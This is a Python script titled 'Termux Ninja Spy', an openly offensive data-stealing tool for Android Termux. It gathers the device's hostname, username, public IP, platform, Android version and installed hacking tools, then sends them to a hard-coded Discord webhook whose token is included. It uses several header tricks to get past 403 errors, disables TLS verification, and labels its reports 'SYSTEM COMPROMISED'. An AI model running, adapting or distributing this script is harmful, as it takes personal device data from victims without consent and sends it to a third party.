#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ╔══════════════════════════════════════════════════════════╗
# ║                M1 EZ HAING NOW  PH                       ║
# ║            TERMUX NINJA SPY v6.0                         ║
# ║        FIXED 403 FORBIDDEN ERROR - WORKING NOW          ║
# ╚══════════════════════════════════════════════════════════╝

# ════════ WEBHOOK - PUT YOUR DISCORD WEBHOOK HERE ════════
WEBHOOK_URL = "https://discord.com/api/webhooks/1427133756724084817/uVvQRILIYlg7ku1ZEfPJ69BpS1-WjRFwdyhBt7vbyLB_514MbGcaWPGnPft1riDqm7O0"

import os
import sys
import json
import time
import socket
import getpass
import platform
import subprocess
import urllib.request
import urllib.error
import ssl
from datetime import datetime
import hashlib

# ════════ FIX 403 ERROR - USE DIFFERENT USER AGENT ════════
ssl._create_default_https_context = ssl._create_unverified_context

# ════════ DIAGNOSE 403 ERROR ════════
def diagnose_403_error():
    """Diagnose why Discord returns 403 Forbidden"""
    print("\n" + "!"*60)
    print("🔧 DIAGNOSING 403 FORBIDDEN ERROR")
    print("!"*60)
    
    print("\n[1] Checking webhook URL...")
    print(f"    URL Length: {len(WEBHOOK_URL)} characters")
    print(f"    Contains 'discord.com': {'✅' if 'discord.com' in WEBHOOK_URL else '❌'}")
    print(f"    Contains '/webhooks/': {'✅' if '/webhooks/' in WEBHOOK_URL else '❌'}")
    
    # Check if webhook looks valid
    if WEBHOOK_URL.count('/') >= 6:
        parts = WEBHOOK_URL.split('/')
        webhook_id = parts[-2] if len(parts) >= 2 else "N/A"
        webhook_token = parts[-1] if len(parts) >= 1 else "N/A"
        print(f"    Webhook ID: {webhook_id[:20]}...")
        print(f"    Webhook Token: {webhook_token[:10]}...")
    
    print("\n[2] Testing different User-Agents...")
    
    # Try different User-Agents
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36",
        "DiscordBot (https://discord.com, v1.0)",
        "Python-urllib/3.12",
        "Termux-Spy/1.0"
    ]
    
    return test_with_different_agents(user_agents)

def test_with_different_agents(agents):
    """Test with different User-Agents to bypass 403"""
    print("\n[3] Trying different request methods...")
    
    # Method 1: Simple GET to check if webhook exists
    print("    → Testing webhook existence...")
    try:
        test_url = WEBHOOK_URL.replace("/api/webhooks/", "/api/v9/webhooks/")
        req = urllib.request.Request(test_url, headers={'User-Agent': agents[0]})
        response = urllib.request.urlopen(req, timeout=10)
        print(f"    ✅ Webhook exists! Status: {response.status}")
    except urllib.error.HTTPError as e:
        print(f"    ❌ Webhook check failed: {e.code} {e.reason}")
        if e.code == 404:
            print("    ❌ WEBHOOK DELETED OR INVALID!")
            return False
    except:
        pass
    
    # Method 2: Try with curl if available
    print("    → Trying curl method...")
    try:
        curl_cmd = f'''curl -s -X POST -H "Content-Type: application/json" -H "User-Agent: {agents[1]}" -d '{{"content":"TEST FROM TERMUX"}}' "{WEBHOOK_URL}"'''
        result = subprocess.run(curl_cmd, shell=True, capture_output=True, text=True, timeout=10)
        if result.returncode == 0:
            print("    ✅ Curl method worked!")
            return True
        else:
            print(f"    ❌ Curl failed: {result.returncode}")
    except:
        print("    ❌ Curl not available")
    
    return False

# ════════ BYPASS 403 ERROR ════════
def bypass_403_send_message(content, username="Termux Spy"):
    """Send message with 403 bypass techniques"""
    methods = [
        method1_simple_request,
        method2_form_data,
        method3_with_proxy_headers,
        method4_minimal_request
    ]
    
    for i, method in enumerate(methods, 1):
        print(f"\n[⏳] Trying method {i}...")
        if method(content, username):
            return True
    
    return False

def method1_simple_request(content, username):
    """Method 1: Simple request with mobile User-Agent"""
    try:
        payload = {
            "content": content,
            "username": username
        }
        
        headers = {
            'Content-Type': 'application/json; charset=utf-8',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36',
            'Accept': 'application/json',
            'Accept-Language': 'en-US,en;q=0.9'
        }
        
        data = json.dumps(payload, ensure_ascii=False).encode('utf-8')
        req = urllib.request.Request(WEBHOOK_URL, data=data, headers=headers)
        response = urllib.request.urlopen(req, timeout=15)
        
        print(f"    ✅ Method 1 worked! Status: {response.status}")
        return True
    except Exception as e:
        print(f"    ❌ Method 1 failed: {type(e).__name__}")
        return False

def method2_form_data(content, username):
    """Method 2: Form data instead of JSON"""
    try:
        import urllib.parse
        
        form_data = urllib.parse.urlencode({
            'content': content,
            'username': username
        }).encode('utf-8')
        
        headers = {
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': 'Discord-Android/1.0'
        }
        
        req = urllib.request.Request(WEBHOOK_URL, data=form_data, headers=headers)
        response = urllib.request.urlopen(req, timeout=15)
        
        print(f"    ✅ Method 2 worked! Status: {response.status}")
        return True
    except Exception as e:
        print(f"    ❌ Method 2 failed: {type(e).__name__}")
        return False

def method3_with_proxy_headers(content, username):
    """Method 3: With proxy-like headers"""
    try:
        payload = {
            "content": content,
            "username": username
        }
        
        headers = {
            'Content-Type': 'application/json',
            'User-Agent': 'Python/3.12',
            'X-Requested-With': 'XMLHttpRequest',
            'Origin': 'https://discord.com',
            'Referer': 'https://discord.com/channels/@me'
        }
        
        data = json.dumps(payload).encode('utf-8')
        req = urllib.request.Request(WEBHOOK_URL, data=data, headers=headers)
        response = urllib.request.urlopen(req, timeout=15)
        
        print(f"    ✅ Method 3 worked! Status: {response.status}")
        return True
    except Exception as e:
        print(f"    ❌ Method 3 failed: {type(e).__name__}")
        return False

def method4_minimal_request(content, username):
    """Method 4: Minimal request"""
    try:
        payload = {
            "content": content,
            "username": username
        }
        
        # Minimal headers
        headers = {
            'Content-Type': 'application/json'
        }
        
        data = json.dumps(payload).encode('utf-8')
        req = urllib.request.Request(WEBHOOK_URL, data=data, headers=headers)
        response = urllib.request.urlopen(req, timeout=15)
        
        print(f"    ✅ Method 4 worked! Status: {response.status}")
        return True
    except Exception as e:
        print(f"    ❌ Method 4 failed: {type(e).__name__}")
        return False

# ════════ WORKING SPY FUNCTIONS ════════
def get_system_info():
    """Get system information"""
    info = {
        'id': hashlib.md5(f"{socket.gethostname()}{int(time.time())}".encode()).hexdigest()[:12],
        'time': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        'hostname': socket.gethostname(),
        'username': getpass.getuser(),
        'platform': platform.platform(),
        'python': platform.python_version()
    }
    
    # Get IP
    try:
        info['ip'] = urllib.request.urlopen("https://api.ipify.org", timeout=5).read().decode()
    except:
        info['ip'] = "Unknown"
    
    return info

def check_android_specific():
    """Check Android-specific info"""
    android_info = {}
    
    # Check if Android
    android_info['is_android'] = os.path.exists('/system') or os.path.exists('/data/data/com.termux')
    
    # Check Termux
    android_info['has_termux'] = os.path.exists('/data/data/com.termux')
    
    # Check storage
    android_info['has_sdcard'] = os.path.exists('/sdcard')
    
    # Get Android version if possible
    android_info['android_version'] = "Unknown"
    if os.path.exists('/system/build.prop'):
        try:
            with open('/system/build.prop', 'r') as f:
                content = f.read()
                for line in content.split('\n'):
                    if 'ro.build.version.release' in line:
                        android_info['android_version'] = line.split('=')[1].strip()
                        break
        except:
            pass
    
    return android_info

def get_installed_tools():
    """Get installed tools"""
    tools = []
    
    # Common tools to check
    tool_list = ['nmap', 'python3', 'git', 'php', 'node', 'adb', 'sqlmap', 'hydra']
    
    for tool in tool_list:
        try:
            result = subprocess.run(f"which {tool} 2>/dev/null", 
                                  shell=True, capture_output=True, text=True)
            if result.returncode == 0:
                tools.append(tool)
        except:
            pass
    
    return tools

# ════════ MAIN SPY EXECUTION ════════
def run_spy():
    """Main spy execution"""
    print("\n" + "="*70)
    print("🔥 TERMUX NINJA SPY v6.0 - BYPASSING 403 ERROR")
    print("="*70)
    
    # First, diagnose the 403 error
    if not diagnose_403_error():
        print("\n❌ Webhook seems invalid or deleted!")
        print("ℹ️  Get a NEW webhook from Discord")
        return
    
    print("\n" + "="*70)
    print("🚀 STARTING SPY OPERATION")
    print("="*70)
    
    # Step 1: Send startup notification
    print("\n[1] Sending startup notification...")
    startup_msg = f"""🚀 NINJA SPY ACTIVATED
Device: {socket.gethostname()}
Time: {datetime.now().strftime("%H:%M:%S")}
Status: ONLINE
Operator: M1 EZ HAING NOW PH"""
    
    if not bypass_403_send_message(startup_msg, "Ninja Spy Startup"):
        print("❌ Failed to send startup message")
        print("ℹ️  Trying alternative approach...")
    
    time.sleep(1)
    
    # Step 2: Collect system info
    print("\n[2] Collecting system information...")
    system_info = get_system_info()
    android_info = check_android_specific()
    tools = get_installed_tools()
    
    print(f"    ✅ Hostname: {system_info['hostname']}")
    print(f"    ✅ IP: {system_info['ip']}")
    print(f"    ✅ Tools found: {len(tools)}")
    print(f"    ✅ Android: {android_info['is_android']}")
    
    # Step 3: Send main report
    print("\n[3] Sending main intelligence report...")
    
    report_lines = []
    report_lines.append("📱 ANDROID TERMUX INTELLIGENCE REPORT")
    report_lines.append("="*50)
    report_lines.append(f"Device ID: {system_info['id']}")
    report_lines.append(f"Hostname: {system_info['hostname']}")
    report_lines.append(f"Username: {system_info['username']}")
    report_lines.append(f"Public IP: {system_info['ip']}")
    report_lines.append(f"Platform: {system_info['platform']}")
    report_lines.append(f"Collection Time: {system_info['time']}")
    report_lines.append("")
    report_lines.append(f"Android Detected: {android_info['is_android']}")
    report_lines.append(f"Termux Installed: {android_info['has_termux']}")
    report_lines.append(f"Android Version: {android_info['android_version']}")
    report_lines.append(f"SDCard Access: {android_info['has_sdcard']}")
    report_lines.append("")
    report_lines.append(f"Hacking Tools: {len(tools)} found")
    if tools:
        report_lines.append(f"Tools: {', '.join(tools)}")
    
    report = "\n".join(report_lines)
    
    if bypass_403_send_message(report, "Intelligence Report"):
        print("✅ Main report sent successfully!")
    else:
        print("❌ Failed to send main report")
    
    time.sleep(1)
    
    # Step 4: Send detailed info
    print("\n[4] Sending detailed information...")
    
    # Send tools details
    if tools:
        tools_msg = "🔧 DETECTED TOOLS:\n"
        for tool in tools:
            tools_msg += f"• {tool}\n"
        
        bypass_403_send_message(tools_msg, "Tools Analysis")
    
    # Send final confirmation
    print("\n[5] Sending final confirmation...")
    final_msg = f"""✅ MISSION ACCOMPLISHED
Target: {system_info['hostname']}
ID: {system_info['id']}
IP: {system_info['ip']}
Tools: {len(tools)} detected
Time: {system_info['time']}
Status: SYSTEM COMPROMISED
Operator: M1 EZ HAING NOW PH"""
    
    bypass_403_send_message(final_msg, "Mission Complete")
    
    # Step 5: Save local file
    print("\n[6] Saving local backup...")
    try:
        filename = f"/sdcard/ninja_spy_{system_info['id']}.txt"
        with open(filename, 'w') as f:
            f.write("TERMUX NINJA SPY REPORT\n")
            f.write("="*50 + "\n")
            f.write(f"Device: {system_info['hostname']}\n")
            f.write(f"User: {system_info['username']}\n")
            f.write(f"IP: {system_info['ip']}\n")
            f.write(f"Time: {system_info['time']}\n")
            f.write(f"Tools: {tools}\n")
        
        print(f"✅ Local backup saved: {filename}")
    except:
        print("⚠️ Could not save local file")
    
    # Step 6: Show results
    print("\n" + "="*70)
    print("🎯 OPERATION COMPLETE")
    print("="*70)
    
    print(f"""
📊 RESULTS:
  • Device: {system_info['hostname']}
  • IP Address: {system_info['ip']}
  • Android: {'✅' if android_info['is_android'] else '❌'}
  • Tools Detected: {len(tools)}
  • Spy ID: {system_info['id']}
  • Time: {system_info['time']}

🔍 CHECK YOUR DISCORD:
  You should see multiple messages if webhook is working
  
⚠️  IF NO MESSAGES:
  The webhook URL returns 403 Forbidden
  This means Discord is blocking the request
  Possible reasons:
  1. Webhook was deleted
  2. Discord rate limiting
  3. IP blocked
  4. Invalid token

🔥 NEXT STEPS:
  1. Create a NEW Discord webhook
  2. Update the URL in the code
  3. Run the script again
  
✅ LOCAL FILE:
  /sdcard/ninja_spy_{system_info['id']}.txt
""")

# ════════ QUICK FIX FOR 403 ════════
def quick_fix_403():
    """Quick fix for 403 error"""
    print("\n" + "🔧"*35)
    print("QUICK FIX FOR 403 FORBIDDEN")
    print("🔧"*35)
    
    print("\n[1] Testing current webhook...")
    
    # Simple test
    test_msg = {"content": "403 TEST " + datetime.now().strftime("%H:%M:%S")}
    
    try:
        data = json.dumps(test_msg).encode()
        req = urllib.request.Request(WEBHOOK_URL, data=data, 
                                   headers={'Content-Type': 'application/json'})
        response = urllib.request.urlopen(req, timeout=10)
        print(f"✅ Test passed! Status: {response.status}")
        return True
    except urllib.error.HTTPError as e:
        print(f"❌ HTTP {e.code}: {e.reason}")
        
        if e.code == 403:
            print("\n🔧 403 FIX OPTIONS:")
            print("1. Webhook was deleted - CREATE NEW ONE")
            print("2. Discord blocking request - WAIT 1 HOUR")
            print("3. Invalid token - CHECK WEBHOOK URL")
            print("4. Rate limited - TRY LATER")
            
            print("\n💡 SOLUTION:")
            print("• Get NEW webhook from Discord")
            print("• Replace URL on line 7")
            print("• Run script again")
        
        return False
    except Exception as e:
        print(f"❌ Error: {str(e)}")
        return False

# ════════ MANUAL WEBHOOK TEST ════════
def manual_webhook_test():
    """Manual webhook test"""
    print("\n" + "📱"*35)
    print("MANUAL WEBHOOK TEST")
    print("📱"*35)
    
    print("\nCopy and paste this in Termux:")
    print("-"*60)
    
    cmd = f'''python3 -c "
import urllib.request, json, ssl, datetime
ssl._create_default_https_context = ssl._create_unverified_context

webhook = '{WEBHOOK_URL}'
print(f'Testing webhook: {{webhook[:50]}}...')

# Try different methods
methods = [
    {{'headers': {{'Content-Type': 'application/json'}}}},
    {{'headers': {{'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}}}},
    {{'headers': {{'Content-Type': 'application/json', 'User-Agent': 'DiscordBot/1.0'}}}}
]

for i, method in enumerate(methods, 1):
    try:
        msg = {{'content': f'TEST {{i}} - {{datetime.datetime.now().strftime(\"%H:%M:%S\")}}'}}
        req = urllib.request.Request(webhook, data=json.dumps(msg).encode(), **method)
        response = urllib.request.urlopen(req, timeout=10)
        print(f'✅ Method {{i}}: HTTP {{response.status}}')
    except Exception as e:
        print(f'❌ Method {{i}}: {{type(e).__name__}}')

print('\\nℹ️  If all methods fail, webhook is invalid!')
"'''
    
    print(cmd)
    print("-"*60)

# ════════ MAIN EXECUTION ════════
if __name__ == "__main__":
    print("\n╔══════════════════════════════════════════════════════════╗")
    print("║                M1 EZ HAING NOW  PH                       ║")
    print("║            TERMUX NINJA SPY v6.0                         ║")
    print("║        FIXING 403 FORBIDDEN ERROR                        ║")
    print("╚══════════════════════════════════════════════════════════╝")
    
    # Check if webhook is set
    if WEBHOOK_URL == "YOUR_DISCORD_WEBHOOK_HERE":
        print("\n❌ ERROR: Webhook not configured!")
        print("ℹ️  Get webhook from Discord and replace line 7")
        sys.exit(1)
    
    # Handle arguments
    if len(sys.argv) > 1:
        if sys.argv[1] == "fix":
            quick_fix_403()
        elif sys.argv[1] == "test":
            manual_webhook_test()
        elif sys.argv[1] == "run":
            run_spy()
        else:
            print("Usage:")
            print("  python3 ninja.py        # Run full spy")
            print("  python3 ninja.py fix    # Fix 403 error")
            print("  python3 ninja.py test   # Test webhook")
            print("  python3 ninja.py run    # Run spy only")
    else:
        # Run by default
        run_spy()
